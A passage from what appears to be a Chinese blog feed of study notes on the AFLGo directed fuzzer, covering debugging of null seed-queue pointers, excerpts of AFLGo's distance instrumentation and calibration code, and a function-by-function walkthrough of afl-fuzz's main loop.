0</strong> 的情况下，<code>cur_distance</code>和<code>cur_bb</code>的值才会更新。否则他们就一直是-1。</p></blockquote><p>而如果他们一直保持-1的值的话, 在calibrate_case()这个函数里面没有办法，更新 <code>queue_max_bb</code> 和 <code>queue_min_distance</code> 的指针 所以这两个指针就一直是空，就容易产生段错误。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if (q-&gt;distance &lt;&#x3D; 0) &#123;  &#x2F;* This calculates cur_distance *&#x2F;  has_new_bits(virgin_bits);  q-&gt;distance &#x3D; cur_distance;  q-&gt;bb &#x3D; cur_bb;  if (cur_distance &gt; 0) &#123;    if (max_distance &lt;&#x3D; 0) &#123;      max_distance &#x3D; cur_distance;      min_distance &#x3D; cur_distance;      queue_min_distance &#x3D; q;    &#125;    if (cur_distance &gt; max_distance) max_distance &#x3D; cur_distance;    if (cur_distance &lt; min_distance) &#123; queue_min_distance &#x3D; q; min_distance &#x3D; cur_distance; &#125;  &#125;  if (cur_bb &gt; 0) &#123;      if (max_bb &lt;&#x3D; 0) &#123;          max_bb &#x3D; cur_bb;          min_bb &#x3D; cur_bb;          queue_max_bb &#x3D; q;      &#125;      if (cur_bb &gt; max_bb) &#123; queue_max_bb &#x3D; q; max_bb &#x3D; cur_bb; &#125;      if (cur_bb &lt; min_bb) min_bb &#x3D; cur_bb;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么问题就又来了，在什么情况下 <code>total_count</code> 的值会 <code>&gt;0</code> ? 这个问题恐怕要回到插桩代码中去了。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">for (auto &amp;F : M) &#123;&#x2F;&#x2F;文件中的所有函数  int distance &#x3D; -1;  for (auto &amp;BB : F) &#123;&#x2F;&#x2F;函数中的所有基本块    distance &#x3D; -1;    if (is_aflgo) &#123;      &#x2F;*      这里获取每个基本块名字的方法和预处理阶段一样，取第一个有效指令的位置信息作为基本块名字      *&#x2F;      std::string bb_name;      for (auto &amp;I : BB) &#123;        std::string filename;        unsigned line;        getDebugLoc(&amp;I, filename, line);&#x2F;&#x2F;获取指令所在的文件名和行数        if (filename.empty() || line &#x3D;&#x3D; 0)          continue;        std::size_t found &#x3D; filename.find_last_of(&quot;&#x2F;\\&quot;);        if (found !&#x3D; std::string::npos)          filename &#x3D; filename.substr(found + 1);        bb_name &#x3D; filename + &quot;:&quot; + std::to_string(line);        break;      &#125;      if (!bb_name.empty()) &#123;        &#x2F;*         比较名字是否相同判断是否是需要插桩的基本块        *&#x2F;        if (find(basic_blocks.begin(), basic_blocks.end(), bb_name) &#x3D;&#x3D; basic_blocks.end()) &#123;          &#x2F;* 如果开启AFLGO_SELECTIVE选项，则不进入后面插桩的逻辑部分，即AFL的逻辑也只对AFLGo选择的基本块插桩           *&#x2F;          if (is_selective)            continue;        &#125; else &#123;          &#x2F;* Find distance for BB *&#x2F;          &#x2F;* 找到对应基本块的距离          *&#x2F;          if (AFL_R(100) &lt; dinst_ratio) &#123;            std::map&lt;std::string,int&gt;::iterator it;            for (it &#x3D; bb_to_dis.begin(); it !&#x3D; bb_to_dis.end(); ++it)              if (it-&gt;first.compare(bb_name) &#x3D;&#x3D; 0)                distance &#x3D; it-&gt;second;          &#125;        &#125;      &#125;    &#125;    &#x2F;* 进入插桩的逻辑部分，前面的部分是AFL的basicblock edge插桩逻辑    *&#x2F;    BasicBlock::iterator IP &#x3D; BB.getFirstInsertionPt();    IRBuilder&lt;&gt; IRB(&amp;(*IP));    if (AFL_R(100) &gt;&#x3D; inst_ratio) continue;    &#x2F;* Make up cur_loc *&#x2F;    unsigned int cur_loc &#x3D; AFL_R(MAP_SIZE);    ConstantInt *CurLoc &#x3D; ConstantInt::get(Int32Ty, cur_loc);    &#x2F;* Load prev_loc *&#x2F;    LoadInst *PrevLoc &#x3D; IRB.CreateLoad(AFLPrevLoc);    PrevLoc-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));    Value *PrevLocCasted &#x3D; IRB.CreateZExt(PrevLoc, IRB.getInt32Ty());    &#x2F;* Load SHM pointer *&#x2F;    LoadInst *MapPtr &#x3D; IRB.CreateLoad(AFLMapPtr);    MapPtr-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));    Value *MapPtrIdx &#x3D;        IRB.CreateGEP(MapPtr, IRB.CreateXor(PrevLocCasted, CurLoc));    &#x2F;* Update bitmap *&#x2F;    LoadInst *Counter &#x3D; IRB.CreateLoad(MapPtrIdx);    Counter-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));    Value *Incr &#x3D; IRB.CreateAdd(Counter, ConstantInt::get(Int8Ty, 1));    IRB.CreateStore(Incr, MapPtrIdx)       -&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));    &#x2F;* Set prev_loc to cur_loc &gt;&gt; 1 *&#x2F;    StoreInst *Store &#x3D;        IRB.CreateStore(ConstantInt::get(Int32Ty, cur_loc &gt;&gt; 1), AFLPrevLoc);    Store-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));        &#x2F;*     下面是AFLGo的距离插桩部分，将该基本块的距离累加到MapDistLoc的位置上，再递增MapCntLoc位置的值，     即：MapDistLoc上的值表示seed经过所有的基本块的距离累加和，MapCntLoc上的值表示seed经过的基本块的数量。    *&#x2F;    if (distance &gt;&#x3D; 0) &#123;      ConstantInt *Distance &#x3D;          ConstantInt::get(LargestType, (unsigned) distance);      &#x2F;* Add distance to shm[MAPSIZE] *&#x2F;      Value *MapDistPtr &#x3D; IRB.CreateBitCast(          IRB.CreateGEP(MapPtr, MapDistLoc), LargestType-&gt;getPointerTo());      LoadInst *MapDist &#x3D; IRB.CreateLoad(MapDistPtr);      MapDist-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));      Value *IncrDist &#x3D; IRB.CreateAdd(MapDist, Distance);      IRB.CreateStore(IncrDist, MapDistPtr)          -&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));      &#x2F;* Increase count at shm[MAPSIZE + (4 or 8)] *&#x2F;      Value *MapCntPtr &#x3D; IRB.CreateBitCast(          IRB.CreateGEP(MapPtr, MapCntLoc), LargestType-&gt;getPointerTo());      LoadInst *MapCnt &#x3D; IRB.CreateLoad(MapCntPtr);      MapCnt-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));      Value *IncrCnt &#x3D; IRB.CreateAdd(MapCnt, One);      IRB.CreateStore(IncrCnt, MapCntPtr)          -&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));    &#125;    inst_blocks++;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>那如果total_count 的值为零的话，是不是说明这个种子压根就没有进入到程序中去?</p></blockquote><p>我又尝试了一下对libxml2的调试, 因为对这个库进行fuzz的时候，种子是仓库中包含的。与预期的符合，可以看出<code>distance</code>和<code>bb</code>都是有值的</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220316111631.png" alt="调试libxml2"></p><hr><p><strong>解决方案就是, 当你在使用这两个指针的时候，记得判断一下是否为空。</strong></p><p>如果都为空的话，直接返回上一个被选中的种子。</p><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>现在有一个问题就是, <code>queue_min_distance</code> 和 <code>queue_max_bb</code> 经常是空指针, 这样就说明种子好像根本没有进到程序当中。</p><p>此外，cron的确是可以定时运行程序的，但是效果不是很好。一开始我是担心，cron启动的进程会不会在资源上有些受限，但是我再次在命令行运行之后，一个小时跑出来的结果居然才21. <strong>也就是说目前AFLGo的运行效果并不稳定，时好时坏</strong>。 </p><blockquote><p>还是要当面监控运行效果，否则很难发现问题到底出在什么地方</p></blockquote><p>短路径优先阶段中，<strong>没有发现更近的种子</strong> 和 <strong>没有发现新路径</strong> 这是两个不同的概念啊！</p><blockquote><p>我觉得对这个概念理解的不同直接导致了编写的算法中 偏向了路径发现。 通过对比和师兄论文中描述的实验对比，可以发现，在 <code>total_path</code> 这一指标上，很明显我的算法要比师兄的算法高。但这已经偏离了我们想要的效果。</p></blockquote><ul><li><code>calibrate_case</code> 和 <code>add_to_queue</code> 这两个函数发生的时机</li></ul><blockquote><p>我是这么理解的，<code>calibrate_case</code>进行的时候，是针对所有已经添加到队列中的种子了。所以我觉得并不需要考虑<code>calibrate_case</code>阶段中<code>min_distance</code>是否改变了。<code>save_if_interesting</code>中调用<code>add_to_queue</code>的时候我们需要看一下<code>min_distance</code>是否发生改变。</p></blockquote><ul><li><code>select_shortest_from_longest</code>函数中的<code>min_distance_in_longest</code>变量是否要更改成<code>0xFFFFFFFF</code></li></ul><p>把前面说的问题都改了，发现改了还不如不改。。。。  不过shortest阶段确实有一些进步。主要是以前无差别探索阶段总是可以探索出好多，但是现在无差别探索阶段探索不出来很多了。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220320170715.png" alt="20220320170715"></p><p>把短路径优先阶段直接改成–只接受更优解的情况之后，效果好了一些。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220321171916.png" alt="20220321171916"></p><p>通过我的观察发现，短路径优阶段一直重复那两个种子。其他的种子得不到fuzz。——<strong>这个是因为current_entry除了第一阶段后面就没有再增加了</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220323110203.png" alt="20220323110203"></p><p>着重看一下select_shortest阶段到底除了啥问题</p>]]></content>
      
      
      <categories>
          
          <category> 毕设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> AFLGo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设-Fuzz-AFLGo源码阅读-5</title>
      <link href="/2022/02/21/bi-she-fuzz-aflgo-yuan-ma-yue-du-5/"/>
      <url>/2022/02/21/bi-she-fuzz-aflgo-yuan-ma-yue-du-5/</url>
      
        <content type="html"><![CDATA[<h1 id="AFLGo源码阅读"><a href="#AFLGo源码阅读" class="headerlink" title="AFLGo源码阅读"></a>AFLGo源码阅读</h1><ul><li><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">AFLGo源码阅读</a><ul><li><a href="#%E6%8C%89%E7%85%A7main%E5%87%BD%E6%95%B0%E4%B8%AD%E7%9A%84%E9%A1%BA%E5%BA%8F">按照Main函数中的顺序</a><ul><li><a href="#setup_signal_handlers">setup_signal_handlers</a></li><li><a href="#check_asan_opts">check_asan_opts()</a></li><li><a href="#fix_up_sync--%E4%B8%8D%E7%9F%A5%E9%81%93%E5%85%B7%E4%BD%93%E7%94%A8%E9%80%94">fix_up_sync()–不知道具体用途</a></li><li><a href="#save_cmdlineargc-argv">save_cmdline(argc, argv)</a></li><li><a href="#fix_up_bannerargvoptind">fix_up_banner(argv[optind])</a></li><li><a href="#check_if_tty">check_if_tty()</a></li><li><a href="#get_core_count">get_core_count()</a></li><li><a href="#bind_to_free_cpu">bind_to_free_cpu()</a></li><li><a href="#check_crash_handling">check_crash_handling()</a></li><li><a href="#check_cpu_governor">check_cpu_governor()</a></li><li><a href="#setup_post">setup_post()</a></li><li><a href="#setup_shm">setup_shm()</a></li><li><a href="#init_count_class16">init_count_class16()</a></li><li><a href="#setup_dirs_fds">setup_dirs_fds()</a></li><li><a href="#read_testcases">read_testcases()</a></li><li><a href="#load_auto">load_auto()</a></li><li><a href="#pivot_inputs">pivot_inputs()</a><ul><li><a href="#c%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86">C语言知识</a></li></ul></li><li><a href="#load_extras">load_extras()</a></li><li><a href="#find_timeout">find_timeout()</a></li><li><a href="#detect_file_args">detect_file_args()</a><ul><li><a href="#c%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86-1">C语言知识</a></li></ul></li><li><a href="#setup_stdio_file">setup_stdio_file()</a></li><li><a href="#check_binary">check_binary()</a></li><li><a href="#get_qemu_argv">get_qemu_argv()</a></li><li><a href="#perform_dry_run">perform_dry_run()</a><ul><li><a href="#calibrate_case">calibrate_case()</a><ul><li><a href="#count_bytes">count_bytes()</a></li><li><a href="#update_bitmap_score">update_bitmap_score()</a></li><li><a href="#minimize_bits">minimize_bits()</a></li></ul></li></ul></li><li><a href="#cull_queue">cull_queue()</a><ul><li><a href="#mark_as_redundant">mark_as_redundant</a></li></ul></li><li><a href="#show_init_stats">show_init_stats()</a></li><li><a href="#find_start_position">find_start_position()</a></li><li><a href="#write_stats_file">write_stats_file()</a></li><li><a href="#save_auto">save_auto()</a></li><li><a href="#fuzz_one--while%E5%BE%AA%E7%8E%AF">fuzz_one &amp;&amp; while循环</a><ul><li><a href="#calculate_score">calculate_score()</a></li><li><a href="#common_fuzz_stuff">common_fuzz_stuff()</a></li><li><a href="#run_target">run_target()</a><ul><li><a href="#c-%E7%9F%A5%E8%AF%86">C 知识</a><ul><li><a href="#%E8%BF%9B%E7%A8%8B%E7%8A%B6%E6%80%81">进程状态</a></li><li><a href="#setitimer">setitimer</a></li></ul></li></ul></li><li><a href="#save_if_interesting">save_if_interesting</a></li></ul></li><li><a href="#write_bitmap">write_bitmap()</a></li><li><a href="#write_stats_file-1">write_stats_file()</a></li><li><a href="#stop_fuzzing">stop_fuzzing:</a></li></ul></li><li><a href="#aflgo%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0">AFLgo命令行启动参数</a></li><li><a href="#linux%E5%91%BD%E4%BB%A4">Linux命令</a></li><li><a href="#%E5%8F%82%E8%80%83">参考</a></li></ul></li></ul><h2 id="按照Main函数中的顺序"><a href="#按照Main函数中的顺序" class="headerlink" title="按照Main函数中的顺序"></a>按照Main函数中的顺序</h2><h3 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>初始化各种信号量</p><p>终止进程的、超时的等等</p><h3 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts()"></a>check_asan_opts()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>通过检查环境变量中的值来判断–检查ASAN设置</p><h3 id="fix-up-sync-–不知道具体用途"><a href="#fix-up-sync-–不知道具体用途" class="headerlink" title="fix_up_sync()–不知道具体用途"></a>fix_up_sync()–不知道具体用途</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>没理解</p><h3 id="save-cmdline-argc-argv"><a href="#save-cmdline-argc-argv" class="headerlink" title="save_cmdline(argc, argv)"></a>save_cmdline(argc, argv)</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>用<code>orig_cmdline</code>保存复制当前命令行</p><h3 id="fix-up-banner-argv-optind"><a href="#fix-up-banner-argv-optind" class="headerlink" title="fix_up_banner(argv[optind])"></a>fix_up_banner(argv[optind])</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>根据最后一个参数设置标头(banner)?</p><h3 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty()"></a>check_if_tty()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>检查是不是在终端运行</p><h3 id="get-core-count"><a href="#get-core-count" class="headerlink" title="get_core_count()"></a>get_core_count()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>从系统文件中获取cpu核的相关信息</p><h3 id="bind-to-free-cpu"><a href="#bind-to-free-cpu" class="headerlink" title="bind_to_free_cpu()"></a>bind_to_free_cpu()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>把进程绑定在具体的内核上？</p><h3 id="check-crash-handling"><a href="#check-crash-handling" class="headerlink" title="check_crash_handling()"></a>check_crash_handling()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>保证core dumps不会进入程序, 否则会增加将崩溃信息通过waitpid传递给fuzzer的延迟。</p><h3 id="check-cpu-governor"><a href="#check-cpu-governor" class="headerlink" title="check_cpu_governor()"></a>check_cpu_governor()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>要把CPU频率调节的算法(可能忽视fuzz产生的短进程)关了，以提高aflgo-fuzz的效率。</p><h3 id="setup-post"><a href="#setup-post" class="headerlink" title="setup_post()"></a>setup_post()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>不理解</p><h3 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm()"></a>setup_shm()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>配置共享内存和<code>virgin_bits</code>, 并且将共享内存的首地址赋值给<code>trace_bits</code>.</p><h3 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16()"></a>init_count_class16()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>之所以用左移是为了加快速度</p><p>最终初始化是下面这个样子。16位一个<br>        0-0 ….      128-0  -256个元素   :0-1-2-4-8-16-32-64-128<br>      ⬇ 0-1 ….<br>        0-2 ….<br>        0-2 ….<br>        0-4 ….<br>        0-4 ….<br>        ………….<br>        0-128….    128-128         一共 65536个 16bit</p><h3 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds()"></a>setup_dirs_fds()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><ol><li><p>flock 了 out_dir_fd</p></li><li><p>创建了跟下面有关的目录</p><ul><li>queue </li><li>crashes</li><li>hangs<br>…. </li></ul></li><li><p>还创建其他的fd(/dev/null&amp;/dev/urandom)方便后续使用</p></li></ol><h3 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases()"></a>read_testcases()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>从<code>input directory</code>中读取所有的测试用例，检测测试用例的大小，以及是否已经完成了<code>deterministic fuzzing</code>阶段，然后添加到queue中。</p><p>初始化</p><ul><li>queued_at_start  Total number of initial inputs</li><li>last_path_time   Time for most recent path (ms)</li></ul><h3 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto()"></a>load_auto()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>加载自动生成的附加组件</p><h3 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs()"></a>pivot_inputs()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><ul><li>首先检查是不是之前跑过的<ul><li>如果是的话，看一下id是不是一致。<ul><li>id一致, 要改变对应entry的depth</li></ul></li><li>如果不是，就起新名字 <code>id:%06u,orig:%s</code></li><li>然后就是重新命名文件，并且更改<code>q-&gt;fname=nfn</code></li></ul></li></ul><h4 id="C语言知识"><a href="#C语言知识" class="headerlink" title="C语言知识"></a>C语言知识</h4><p>strrchr和strchr类似，但是从右向左找字符c，找到字符c第一次出现的位置就返回，函数名中间多了一个字母r可以理解为Right-to-left。</p><h3 id="load-extras"><a href="#load-extras" class="headerlink" title="load_extras()"></a>load_extras()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>这个没看懂是干啥的。<br>跟这些有关，但是不知道具体在fuzz的过程中起到了什么作用</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">struct extra_data &#123;  u8* data;                           &#x2F;* Dictionary token data            *&#x2F;  u32 len;                            &#x2F;* Dictionary token length          *&#x2F;  u32 hit_cnt;                        &#x2F;* Use count in the corpus          *&#x2F;&#125;;static struct extra_data* extras;     &#x2F;* Extra tokens to fuzz with        *&#x2F;static u32 extras_cnt;                &#x2F;* Total number of tokens read      *&#x2F;static struct extra_data* a_extras;   &#x2F;* Automatically selected extras    *&#x2F;static u32 a_extras_cnt;              &#x2F;* Total number of tokens available *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout()"></a>find_timeout()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>只有在Resuming an older fuzzing job的情况下，才会使用。</p><p>从状态目录中读取文件名, 并把<code>exec_timeout :</code>后面的值复制给<code>exec_tmout</code>, 将timeout_given赋值为3.</p><h3 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args()"></a>detect_file_args()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>根据参数@@后面带的东西，更改文件名. 看的也不是很懂。</p><h4 id="C语言知识-1"><a href="#C语言知识-1" class="headerlink" title="C语言知识"></a>C语言知识</h4><p>定义函数：char * getcwd(char * buf, size_t size);</p><p>函数说明：getcwd()会将当前的工作目录绝对路径复制到参数buf 所指的内存空间，参数size 为buf 的空间大小。</p><p>注：<br>1、在调用此函数时，buf 所指的内存空间要足够大。若工作目录绝对路径的字符串长度超过参数size 大小，则返回NULL，errno 的值则为ERANGE。<br>2、倘若参数buf 为NULL，getcwd()会依参数size 的大小自动配置内存(使用malloc())，如果参数size 也为0，则getcwd()会依工作目录绝对路径的字符串程度来决定所配置的内存大小，进程可以在使用完次字符串后利用free()来释放此空间。</p><h3 id="setup-stdio-file"><a href="#setup-stdio-file" class="headerlink" title="setup_stdio_file()"></a>setup_stdio_file()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>如果没有用-f指定输出文件的话, 那就用默认的<code>.cur_input</code>创建</p><h3 id="check-binary"><a href="#check-binary" class="headerlink" title="check_binary()"></a>check_binary()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>具体代码没看。。</p><p>检查目标二进制文件是否存在，以及它是否是shell脚本。确保可以进行afl的插桩。</p><h3 id="get-qemu-argv"><a href="#get-qemu-argv" class="headerlink" title="get_qemu_argv()"></a>get_qemu_argv()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>不知道干啥的</p><h3 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run()"></a>perform_dry_run()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>简单的把所有的测试用例都提前运行一遍，确保程序像预期的那样运行。如果不是的话，会有一些相应的提示。</p><h4 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case()"></a>calibrate_case()</h4><p>测试一个entry，看看是不是有覆盖率、新的路径的添加等等变量是否正常工作啥的。 </p><p>这里会运行<code>run_target</code>来计算<code>distance</code>, 这是对已经加入队列的entry而言的。</p><p>关于<code>entry</code>属性里面的<code>var_behavior</code>的理解: 因为在<code>calibrate</code>的阶段中，是没有发生变异的，那么如果测试用例在经过不同次数的执行后，产生了不一样的<code>path</code>。那么就把这个<code>entry</code>标记为<code>variable</code>。<strong>这个属性并没有影响到后续的其他步骤</strong>。根据注释，应该只是简单的标注，方便能找到吧。</p><h5 id="count-bytes"><a href="#count-bytes" class="headerlink" title="count_bytes()"></a>count_bytes()</h5><p>数一下有多少个字节不为零, 8位代表一个path, 不同的命中次数可能会导致8位中不同位置的bit置1</p><h5 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score()"></a>update_bitmap_score()</h5><p>当某个entry触发了新的path, 我们要与之前的同样触发这个path的”最优”的entry进行一个比较。看看到底谁更优秀。</p><p>所谓的<code>top_rated[]</code> 就是 <code>a minimal set of paths that trigger all the bits seen in the bitmap so far.</code></p><h5 id="minimize-bits"><a href="#minimize-bits" class="headerlink" title="minimize_bits()"></a>minimize_bits()</h5><p>把<code>trace_bits</code>压缩为一个占用空间更小的数组。1位代表一个<code>path</code>现在。所以刚好是分配了<code>MAP_SIZE&gt;&gt;3</code>的空间。</p><h3 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue()"></a>cull_queue()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p><code>top_rated[i]</code> 代表的就是发现路径序号为i的最优entry(fav_factor最小的) 而且<strong>关键的是top_rated[i] 指针指向的是queue中的特定的entry</strong>。所以在将<code>top_rated[i]-&gt;favored = 1 </code>时，原来<code>queue</code>中的<code>entry</code>的<code>favored</code>也同样被设置为1</p><p>值得注意的是，并不是说<code>top_rated[]</code>中所有的<code>entry</code>都是<code>favored</code>的。当且仅当你发现的<code>path</code>是你之前<code>entry</code>都没有发现过的情况下，这个<code>entry</code>才会被设置为<code>favored</code></p><blockquote><p>我觉得这里有个值得深思的地方，程序这样设计的话，test_case的顺序会影响到其是否会被设置为favored. 这种随机性会不会对框架整体的性能产生一定的影响。</p></blockquote><h4 id="mark-as-redundant"><a href="#mark-as-redundant" class="headerlink" title="mark_as_redundant"></a>mark_as_redundant</h4><p>把对应的<code>entry</code>标记为<code>redundant</code>，其间还会创建一些目录，至于什么作用没看懂。</p><h3 id="show-init-stats"><a href="#show-init-stats" class="headerlink" title="show_init_stats()"></a>show_init_stats()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>显示统计数据 Total calibration cycles\max_bits\min_bits\exec_us\len等等</p><p>根据平均运行时间重新设置一个<code>timeout_given</code></p><h3 id="find-start-position"><a href="#find-start-position" class="headerlink" title="find_start_position()"></a>find_start_position()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>当要恢复程序进程的时候，从<code>fuzzer_stats</code>目录的文件的文件名中读取相应的位置。</p><h3 id="write-stats-file"><a href="#write-stats-file" class="headerlink" title="write_stats_file()"></a>write_stats_file()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>把用到的基本状态信息都写入到状态文件中，这些变量都会在终端页面显示中用到。</p><h3 id="save-auto"><a href="#save-auto" class="headerlink" title="save_auto()"></a>save_auto()</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>自动保存生成的extras，这个跟token有关系，但没看懂token到底有什么作用。</p><h3 id="fuzz-one-amp-amp-while循环"><a href="#fuzz-one-amp-amp-while循环" class="headerlink" title="fuzz_one &amp;&amp; while循环"></a>fuzz_one &amp;&amp; while循环</h3><p><a href="#aflgo%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB">回到目录</a></p><p>接下来是循环中的函数</p><ul><li><p>首先在进入循环之前, 要先cull_queue, 把favor的entry标记出来</p></li><li><p>判断queue_cur是否为空</p><ul><li>如果为空的话，说明是第一次进入循环。进行必要的初始化。</li></ul></li><li><p>然后就是fuzz_one</p><ul><li>判断在当下的队列中，是否含有 <code>favored\non-fuzzed</code> 的<code>entry</code>，如果有那么会<strong>以99%的概率跳过那些已经被fuzz过或者不是favored</strong>的<code>entry</code>.</li><li>如果没有上面所说的那种类型的<code>entry</code> 会以75%跳过not fuzzed ，以95%跳过fuzzed的<code>entry</code>。 </li><li>然后将test case中的内容映射到内存中，这样文件中的位置直接就有对应的内存地址，对文件的读写可以直接用指针来做而不需要<code>read</code>\<code>write</code>函数。</li><li>如果最初的calibration阶段失败了, 那现在要重新来一遍。</li><li><code>trimming</code>阶段，<strong>这个阶段的作用，没看懂</strong>。 